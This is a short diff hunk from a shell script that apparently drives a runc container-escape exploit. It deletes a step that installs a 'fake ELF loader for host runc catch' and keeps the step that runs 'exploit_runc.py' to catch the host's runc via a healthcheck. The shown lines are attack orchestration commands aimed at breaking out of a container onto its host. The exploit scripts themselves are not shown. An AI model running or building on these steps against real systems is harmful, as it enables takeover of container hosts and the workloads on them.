@@ -42,8 +42,5 @@ except OSError:
     pass
 PY
 
-echo "[+] installing fake ELF loader for host runc catch"
-"$DCF_PY" "$DCF_WORK/install_fake_loader.py" install "$DCF_WORK"
-
 echo "[+] catching host runc via healthcheck"
 "$DCF_PY" "$DCF_WORK/exploit_runc.py" "$DCF_WORK" "$@"
